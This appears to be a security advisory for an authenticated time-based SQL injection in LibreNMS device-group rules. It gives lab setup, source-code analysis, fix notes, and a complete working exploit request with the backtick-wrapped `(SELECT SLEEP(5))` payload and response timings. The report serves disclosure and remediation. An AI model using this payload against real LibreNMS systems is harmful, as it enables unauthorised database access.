### Vulnerability details

**Official website / Product:** https://www.librenms.org/

**Repository:** https://github.com/librenms/librenms (stars at selection: 4984)

**Vulnerability type:** SQLi (time-based blind / SQL expression injection)

**Vulnerability versions:** 26.10.2 (Docker `librenms/librenms:latest`, About page 26.10.2; image id at audit `795ba6773c7e`); audited source commit `5f0808851bc3163423369b9109bcd94f144e54e6` (master; QueryBuilderFluentParser sink matches the image)

**Vulnerability URL / Parameter:** `POST /device-groups` form field `rules` (JSON); when a dynamic group rule `rules[].value` is wrapped in backticks, it is interpolated via `DB::raw()` into SQL

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/librenms-r30-a1` was removed after verification). In any directory, write the minimal compose below (service set: `librenms` + `dispatcher` + `mariadb:10` + `redis:7.2-alpine`, host port **21001→8000**; set `http_proxy=http://127.0.0.1:7890` if pulls need a proxy):

```yaml
# docker-compose.yml — matches verified topology
# (omits official-example msmtpd/syslogng/snmptrapd sidecars)
services:
  db:
    image: mariadb:10
    command:
      - "mysqld"
      - "--innodb-file-per-table=1"
      - "--lower-case-table-names=0"
      - "--character-set-server=utf8mb4"
      - "--collation-server=utf8mb4_unicode_ci"
    environment:
      - TZ=UTC
      - MARIADB_RANDOM_ROOT_PASSWORD=yes
      - MYSQL_DATABASE=librenms
      - MYSQL_USER=librenms
      - MYSQL_PASSWORD=r30a1-lab-db-pass
    volumes:
      - ./db:/var/lib/mysql
    restart: unless-stopped

  redis:
    image: redis:7.2-alpine
    environment:
      - TZ=UTC
    restart: unless-stopped

  librenms:
    image: librenms/librenms:latest
    hostname: librenms
    ports:
      - "21001:8000"
    depends_on:
      - db
      - redis
    volumes:
      - ./librenms:/data
    environment:
      - TZ=UTC
      - PUID=1000
      - PGID=1000
      - DB_HOST=db
      - DB_NAME=librenms
      - DB_USER=librenms
      - DB_PASSWORD=r30a1-lab-db-pass
      - DB_TIMEOUT=60
      - CACHE_DRIVER=redis
      - SESSION_DRIVER=redis
      - REDIS_HOST=redis
    restart: unless-stopped

  dispatcher:
    image: librenms/librenms:latest
    hostname: librenms-dispatcher
    depends_on:
      - librenms
      - redis
    volumes:
      - ./librenms:/data
    environment:
      - TZ=UTC
      - PUID=1000
      - PGID=1000
      - DB_HOST=db
      - DB_NAME=librenms
      - DB_USER=librenms
      - DB_PASSWORD=r30a1-lab-db-pass
      - DB_TIMEOUT=60
      - DISPATCHER_NODE_ID=dispatcher1
      - SIDECAR_DISPATCHER=1
      - CACHE_DRIVER=redis
      - SESSION_DRIVER=redis
      - REDIS_HOST=redis
    restart: unless-stopped
```

```bash
docker compose up -d
# wait for 0.0.0.0:21001->8000/tcp; audit image librenms/librenms:latest id=795ba6773c7e, UI About=26.10.2
# expected compose ps: librenms / dispatcher / db(mariadb:10) / redis(redis:7.2-alpine) all Up; librenms maps 0.0.0.0:21001->8000/tcp
```

2. Open `http://127.0.0.1:21001/`, finish the web installer. Lab admin created at verify time: `admin` / `Lnms!R30a1-LabOnly-9f3c2e`. Ensure `devices` has ≥1 row (an empty table may skip evaluating the WHERE scalar subquery so SLEEP will not delay; add a dummy device in the UI or insert a row in the DB).

3. Log in as admin, open `/device-groups/create`, collect CSRF `_token` from the form and keep session cookies (`XSRF-TOKEN`, `laravel_session`). Cookies/`_token` in the PoC below are the values captured on the verify day; replace them with your own session when reproducing.

4. Baseline: `POST /device-groups` with `type=dynamic` and rule `value` plain `1`. Expect a fast (~tens of ms) `302` (measured `time_total=0.058063`, `http_code=302`).

5. Exploit: same endpoint with `rules[].value` set to `` `(SELECT SLEEP(5))` `` (including wrapping backticks). Expect HTTP completion ≈ **5 seconds**, still `302`, group persisted (measured `time_total=5.066640`, `time_starttransfer=5.066414`, `wall_s≈5.075`, `http_code=302`, `Location: http://127.0.0.1:21001/device-groups`).

6. Optional: inside the app container, `artisan tinker` rebuild for the just-created group (verify-time `name=sqli-verified-proof`, id=7) with `QueryBuilderFluentParser::fromJson($g->rules)->toQuery()->toSql()` / `getBindings()` → expect:

```text
SQL=select * from `devices` where (`devices`.`status` = (SELECT SLEEP(5)))
bindings=[]
elapsed_ms=5000.883
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /device-groups HTTP/1.1
Host: 127.0.0.1:21001
User-Agent: curl/8.5.0-r30-a1-librenms-sqli
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:21001
Referer: http://127.0.0.1:21001/device-groups/create
Cookie: XSRF-TOKEN=eyJpdiI6IkJheC80eVdVeE5NSXFlM2g1K0J5c0E9PSIsInZhbHVlIjoiTmJ4ekZZbkwxemMwTmZFUzgvMzFSdzJwMHY3NloxdGZnemZuN3FKN1l1MXFkZ3N1ckJ0SlNzam02dWVrMjhWdVVKeHRuZEZGRDVsN1BKR0t6ajkvajFGWFcxMWF0bHZIRmVwZmJpQit1MHFwRk5ZTFBZalhxUjcvTzd1dE9NVy8iLCJtYWMiOiI5MDU4YWJlZTk4YTE2ZWRiNmM2OWE5Nzk4ODYzZGIzNjk4NjY0Y2YwOTc0YjU3MmEzOWZjNTEzYTAxYTVlZDRhIiwidGFnIjoiIn0%253D; laravel_session=eyJpdiI6IkNSNktDRm1xRGxTTkJVb0YzUVZrWGc9PSIsInZhbHVlIjoiVGNBamFhb2VSNHA1dVdVUERseUdYZXBSYnFKL0xhR0ZnZTNhWkxWUFg2UStHSUcyWTVwV2N3V0EvMVRtNkNrRmk1VkVvQlJ1bk5sS1kxYjBVMXQyTjZVczVTWUhuamRTNnA3Vlc1cUcxTGgrQTJqSTBzZSt1MEhzUVdMVVlieDUiLCJtYWMiOiIwNzc1NTVkYWUyYjZkZjdlOGQ1NDI4NjAzNDFlZDc0NjhhYmJlMzI5OWU2YzllMGJmMDc1NWQ2Y2MwYjM4NjRlIiwidGFnIjoiIn0%3D
Content-Length: 421
Connection: close

_token=XjRqsCcZziLjRewz17HCEld8toJFanVeaB7dM8y0&name=sqli-verified-proof&desc=time-based+SQLi+Docker+evidence&type=dynamic&rules=%7B%22condition%22%3A%22AND%22%2C%22rules%22%3A%5B%7B%22id%22%3A%22devices.status%22%2C%22field%22%3A%22devices.status%22%2C%22type%22%3A%22integer%22%2C%22input%22%3A%22text%22%2C%22operator%22%3A%22equal%22%2C%22value%22%3A%22%60%28SELECT+SLEEP%285%29%29%60%22%7D%5D%2C%22valid%22%3Atrue%7D
```

URL-decoded form fields (for readability; send the application/x-www-form-urlencoded body above as-is):

- `_token` = `XjRqsCcZziLjRewz17HCEld8toJFanVeaB7dM8y0`
- `name` = `sqli-verified-proof`
- `desc` = `time-based SQLi Docker evidence`
- `type` = `dynamic`
- `rules` (JSON) =

```json
{
  "condition": "AND",
  "rules": [
    {
      "id": "devices.status",
      "field": "devices.status",
      "type": "integer",
      "input": "text",
      "operator": "equal",
      "value": "`(SELECT SLEEP(5))`"
    }
  ],
  "valid": true
}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 302 Found
Server: nginx
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Keep-Alive: timeout=10
Cache-Control: no-cache, private
Date: Sun, 01 Nov 2026 23:46:34 GMT
Location: http://127.0.0.1:21001/device-groups
Set-Cookie: XSRF-TOKEN=eyJpdiI6InJ2VGFGUXdJdm1tbFdkMjlKRFFlUEE9PSIsInZhbHVlIjoiU3VqMk56VzV2UVRBeVo4V013b2J0SmJBMWlGbk1GY2RRZUxkdTQxV0xRUEc4RTJQcmg0dXpQd0YzUTJSajAzRURDeWVlbWZVRUZLOUZjOUdPbVExSG05NVYvWUp4RUFpZFlnQUZJODVrZFhtTnNTK2RnWjJxZHlYREc4b3NFcU4iLCJtYWMiOiJmYWIzYzg0MDYxZjg2YjQ5ZjI2MDQwMmMxMjVmNmUxMTI0YzYzZjIxZjVlZjY3ZGI4OGJiMmYyODY3ODE0NDA1IiwidGFnIjoiIn0%3D; expires=Fri, 13 Nov 2026 23:46:34 GMT; Max-Age=1036800; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IkxoSDdxNUdaVEFZZVJnNGo1K05UcGc9PSIsInZhbHVlIjoiUG9waDNaUzdQQUd3akNXcktwRlcyMmZtMWV4elR6bmQxNWh3TUU1NGIwSGhibDExSjQxZEE3MlR5Ykk1Q0ZmTHBlMVNLYkJzM29FWXlCenpUN0VoVzAzb3hmL29VeVFPbXFSam9xZkV5b1FFbktBMTIyL09lR0xVbGpJM25LVEUiLCJtYWMiOiJlYWFiNmI4MTk1MjUzNjQxMjI1Zjg0YmRhNzBkZmViZmEwMTBjNTc1YjQ3YmE3NGYzOTZiMTIzMTdhYjhiNDBjIiwidGFnIjoiIn0%3D; expires=Fri, 13 Nov 2026 23:46:34 GMT; Max-Age=1036800; path=/; httponly; samesite=lax


<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://127.0.0.1:21001/device-groups'" />

        <title>Redirecting to http://127.0.0.1:21001/device-groups</title>
    </head>
    <body>
        Redirecting to <a href="http://127.0.0.1:21001/device-groups">http://127.0.0.1:21001/device-groups</a>.
    </body>
</html>
```

Verification result notes:

- Baseline create (`value=1`): `http_code=302`, `time_total=0.058063` s.
- Exploit create (`value=` `` `(SELECT SLEEP(5))` ``, group name `sqli-verified-proof`): `http_code=302`, `time_namelookup=0.000024`, `time_connect=0.000112`, `time_starttransfer=5.066414`, `time_total=5.066640`, `size_download=390`, `wall_s=5.074957609176636`; `Location: http://127.0.0.1:21001/device-groups`.
- DB row `device_groups.name=sqli-verified-proof` (id=7) stores the backtick payload intact.
- Artisan rebuild from stored rules: `select * from devices where (devices.status = (SELECT SLEEP(5)))` (Laravel quotes table/column identifiers with backticks in the toSql() string), `bindings=[]`; re-exec `elapsed_ms=5000.883`. Confirms the backtick path used `DB::raw`, not parameter binding.
- Impact: an authenticated user with `device-group.create` can inject arbitrary SQL expressions into dynamic device-group sync queries via backtick-wrapped rule values; the same sink is also used by `ServiceTemplate::updateDevices()`. Distinct from intentional Alert `override_query`.

### Vulnerability analysis

Saving a dynamic device group calls `DeviceGroup::updateDevices()`, which compiles UI rule JSON through `QueryBuilderFluentParser` into a Laravel query and `pluck`/`sync`s member devices. `expandRule()` treats backtick-wrapped values as intended **column references** and calls `DB::raw(expandMacro(trim($value, '`')))` with **no** identifier allowlist, so arbitrary SQL expressions reach the RHS of WHERE comparisons. The same parser is used by `ServiceTemplate::updateDevices()`. This differs from Alert `override_query`, which is explicit admin free-form SQL: the device-group builder is only supposed to reference columns/macros, yet backticks become an executable-expression bypass.

Requires an authenticated user with `device-group.create` (or update). LibreNMS has historically CVE-rated authenticated SQLi of this class.

Trigger / sink source (full path and line numbers):

```php
# File: LibreNMS/Alerting/QueryBuilderFluentParser.php
# Lines: 128-142
protected function expandRule(array $rule): array
{
    $field = $rule['field'];
    if (Str::startsWith($field, 'macros.')) {
        $field = DB::raw($this->expandMacro($field));
    }

    $op = $rule['operator'];

    $value = $rule['value'];
    if (is_string($value) && Str::startsWith($value, '`') && Str::endsWith($value, '`')) {
        $value = DB::raw($this->expandMacro(trim($value, '`')));
    }

    return [$field, $op, $value];
}
```

```php
# File: app/Models/DeviceGroup.php
# Lines: 57-84
static::saved(function (DeviceGroup $deviceGroup): void {
    if ($deviceGroup->isDirty('rules')) {
        $deviceGroup->updateDevices();
    }
});

public function updateDevices()
{
    if ($this->type == 'dynamic') {
        $this->devices()->sync(QueryBuilderFluentParser::fromJson($this->rules)->toQuery()
            ->distinct()->pluck('devices.device_id'));
    }
}
```

```php
# File: app/Http/Controllers/DeviceGroupController.php
# Lines: 50-64 (entry: validate, assign rules, save)
public function store(Request $request, ToastInterface $toast)
{
    $this->authorize('create', DeviceGroup::class);

    $this->validate($request, [
        'name' => 'required|string|unique:device_groups',
        'type' => 'required|in:dynamic,static',
        'devices' => 'array|required_if:type,static',
        'devices.*' => 'integer',
        'rules' => 'json|required_if:type,dynamic',
    ]);

    $deviceGroup = new DeviceGroup($request->only(['name', 'desc', 'type']));
    $deviceGroup->rules = json_decode($request->rules);
    $deviceGroup->save();
```

### Fix notes

1. Allow backtick values only when they match a strict column pattern (e.g. `^[A-Za-z0-9_.]+$`) or the QueryBuilderFilter allowlist; reject subqueries/function calls.
2. Do not `DB::raw` user-controlled strings without bindings; wrap column names via the grammar and bind values.
3. Apply the same validation on the `ServiceTemplate` sync path.
4. Regression tests: `` `(SELECT SLEEP(1))` `` / illegal identifiers must be rejected and never executed.
